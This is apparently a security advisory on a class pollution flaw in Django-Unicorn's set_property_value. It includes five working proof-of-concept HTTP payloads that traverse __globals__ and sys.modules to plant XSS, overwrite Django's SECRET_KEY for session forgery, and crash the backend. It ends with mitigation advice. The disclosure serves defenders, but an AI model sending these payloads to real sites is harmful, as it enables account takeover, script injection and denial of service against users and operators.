# Summary

Django-Unicorn is vulnerable to python class pollution vulnerability, a new type of vulnerability categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html). The vulnerability arises from the core functionality `set_property_value`, which can be remotely triggered by users by crafting appropriate component requests and feeding in values of second and third parameter to the vulnerable function, leading to arbitrary changes to the python runtime status. 

With this finding, so far we've found at least five ways of vulnerability exploitation, stably resulting in Cross-Site Scripting (XSS), Denial of Service (DoS), and Authentication Bypass attacks in almost every Django-Unicorn-based application.

# Analysis of Vulnerable Function

By taking a look at the vulnerable function `set_property_value` located at: `django_unicorn/views/action_parsers/utils.py`. We can observe the functionality is responsible for modifying a property value of an object. 

The property is specified by a dotted form of path at the second parameter `property_name`, where nested reference to object is supported, and base object and the assigned value is given by the first parameter `component` and third parameter `property_value`.

```python
# https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10
def set_property_value(
    component,
    property_name,
    property_value
) -> None:
    ...
    property_name_parts = property_name.split(".")
    component_or_field = component
    ...
    for idx, property_name_part in enumerate(property_name_parts):
        if hasattr(component_or_field, property_name_part):
            if idx == len(property_name_parts) - 1:
                ...
                setattr(component_or_field, property_name_part, property_value)
                ...
            else:
                component_or_field = getattr(component_or_field, property_name_part)
                ...
        elif isinstance(component_or_field, dict):
            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part] = property_value
				...
            else:
                component_or_field = component_or_field[property_name_part]
				...
        elif isinstance(component_or_field, (QuerySet, list)):
            property_name_part_int = int(property_name_part)

            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part_int] = property_value  # type: ignore[index]
                ...
            else:
                component_or_field = component_or_field[property_name_part_int]  # type: ignore[index]
                ...
        else:
            break
```

Meanwhile, this functionality can be directly triggered by a component request, one of the core functionalities of the project, by specifying the request type as `syncInput` and payload object would be fed in the dotted-path (2nd) parameter and assigned value (3rd) parameter of the vulnerable function.

```json
POST /unicorn/message/COMPONENT_NAME

{
    "id": 123,
    "actionQueue":[
        {
          "type": "syncInput",
          "payload": {
          "name": "DOTTED_PATH",
          "value":"ASSIGNED_VALUE"
          }
    		}
    ],
    "data": {XXX},
    "epoch": "123",
    "checksum": "XXXX"
}
```

We are now aware of that users from the remote can fully control the `property_name` and `property_value` of the vulnerable function. By default the preperty value overwrite can only be performed on the component object, which is always the first parameter of the function.

However, the functionality failed to count in the situation where bad actors can modify the normal path to traverse to other objects in the python runtime, by leveraging the **magic attributes**. For example, if the `property_name` was set to `__init__.__globals__`, the component context would change to global context of the component module, which means we can modify any attributes of the objects that are located in the global scope of the component module. These objects also include other modules that have been imported in the component module, which comprises of a pollutable dependency chain.

With all these techniques introduced, we can now change any global objects including, global variables/instances/classes/functions of any module that is in a chain of dependency from the component module.

In the next section, I will introduce the five exploitation gadgets we found so far, leading to reflected XSS, stored XSS, authentication bypass and DOS attack. We'll also use a locally deployed `django-unicorn.com`  as demo website to showcase its large-scale impact.

> Here, gadgets refer to the dependency code snippets by default introduced by django-unicorn and changing its status can result in an attack sequence, such as XSS.

# Proof of Concept

## #1 Reflected Cross-Site Scripting by Overwriting bs4 HTML sanitizer

Django-Unicorn implants the `EntitySubstitution` rule from beautifulsoup4 library into its [HTML formatter](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/components/unicorn_template_response.py#L125), formatting all the template response messages.

![image-20250121163510422](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-35-11-a1aa5cfa196383e3a26636eb80bd85f0.png)

While [this rule](https://github.com/akalongman/python-beautifulsoup/blob/master/bs4/dammit.py#L79) is specified in a global dictionary, we can exploit the class pollution vulnerability to overwrite it.

```http
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<",
        "value": "<img/src=1 onerror=alert('bs4_html_entity_bypass')>"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
```

In this demonstration, we replaced the sanitizer's `<` item value with the XSS payload. whenever a template reponse renders a "<" in cleartext, it will be converted to the payload, leading to XSS attack.

![bs4-xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-40-56-5ecbe8f2d39a6cc9a546744ca995b2d9.gif)

## #2 Stored Cross-Site Scripting by Overwriting Unicorn Setting and [Django](https://github.com/django/django) Json Script Sanitizer

We observed in the latest version of Django-unicorn, there is always a script tag in the webpage. Among it, a `NAME` value is dynamically extracted both from the `MORPHER_NAMES` and `DEFAULT_MORPHER_NAME` variable in the [setting module](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/settings.py#L12). 

![image-20250121165007647](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-50-08-f2a628f8d06ba81c9bb71f78766cecb7.png)

However, simply polluting these values can not lead to a stored XSS attack. Django by default escape some of the special characters into unicode sequences.

![image-20250121164947336](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-49-47-b756d516b0b3e3d025d876963e1dbf6a.png)

Going through the source code of django, we found out the actual sanitizer located at `_json_script_escapes` variable at [django/utils/html.py](https://github.com/django/django/blob/862b7f98a02b7973848db578ff6d24ec8500fdb4/django/utils/html.py#L84).

![image-20250121165247245](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-52-47-b60cd91f46ed89bc7b0a4b3f68521827.png)

By polluting this variable to clear it out, we finally achieve a stored XSS attack.

![image-20250121165839892](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-40-97608fc15544d68edbfbdc8e61744b12.png)

PoC:

```http
POST /unicorn/message/todo HTTP/1.1

{
  "id": "3gpDSUcxzs1",
  "data": {
    "task": "",
    "tasks": []
  },
  "checksum": "XXX",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES",
        "value": [
          "</script><script>alert('django json unicode escape bypass + configuration overwrite')</script>"
        ]
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME",
        "value": "</script><script>alert('django json unicode escape bypass + configuration overwrite')</script>"
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.utils.html._json_script_escapes",
        "value": {}
      }
    }
  ],
  "epoch": 1737318956605,
  "hash": "jWGuTFzy"
}
```

![json_unicode_xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/16-58-59-f8da2463bbaa8de4f305c6fd2235172b.gif)

## #3 Stored Cross-Site Scripting by Overwriting [Django](https://github.com/django/django) Error Page Source Code

Django by default stores its error page source code in a global variable named `ERROR_PAGE_TEMPLATE` at [django/views/defaults.py](https://github.com/django/django/blob/main/django/views/defaults.py#L16). 

![image-20250121170357900](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-03-58-86c9cf2abfa28f0e1ed479521af5be2e.png)

By polluting this variable to XSS payload. whenever a user triggers an error in the application, such as access an unexisting resource, the attack payload fires out.

```http
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
        "value": "<html><script>alert('error page pollution')</script></html>"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
```

![django-404-xss](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-05-05-e6ce889e7549243a5d8a60877fbb8cff.gif)

## #4 Authentication Bypass by Overwriting [Django](https://github.com/django/django) Secret Key 

Django secret key is typically used to sign and verify session cookies and other security related mechanism. By polluting its runtime value to attacker intended, attacker can forge session cookies to login in to the system as any user.

Even though, django-unicorn.com doesn't have an authentication layer, we can still observe a successful secret key pollution by inspecting the changed checksum in the HTTP response, since the checksum is generated by encrypting the data field in the request body with the secret key.

```HTTP
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY",
        "value": "test"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
```

![authentication_bypass](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-12-20-424da7c5c960471600863828fba93c4a.gif)

## #5 Denial of Service by Overwriting `timed` Decorator Method

The [timed](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/decorators.py#L9) decorator is used to modify many important functions in the django-unicorn, such as [_call_method_name](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/call_method.py#L122).

![image-20250121171823756](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-18-24-0e1cec22199ab2dc1bc9bbcb76d2dcd9.png)

By polluting the core decorator method `timed`  to a string, we make a function call always call a uncallable string, leading to the backend crashed, thus denial of service attack.

```http
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.timed",
        "value": "X"
      }
    }
  ],
  "data": {
    "task": "",
    "tasks": []
  },
  "epoch": "123",
  "checksum": "XXX"
}
```

![dos_attack](https://api.2h0ng.wiki:443/noteimages/2025/01/21/17-20-39-20ab579669a459c7fb54afeab21dcd4e.gif)

# Mitigation

The patch could be:

- Blocking paths that start with `__`,  which represent **double under (dunder)** or **magic variables/methods**
- Set a blacklist for the path, such as `RESTRICTED_KEYS = ("__globals__", "__builtins__")` adopted by [pydash](https://github.com/dgilland/pydash/blob/f4112f61ddb02e5181e781709d775838c9978b97/src/pydash/helpers.py#L211).

# Related Materials

For more information about class pollution please refer to:

[1] [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)

[2] [Report: Class Pollution leading to RCE in pydash](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca)

[3] [Blog: Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

[4] [Blog: Class Pollution Gadgets in Jinja Leading to RCE](https://www.offensiveweb.com/docs/programming/python/class-pollution/)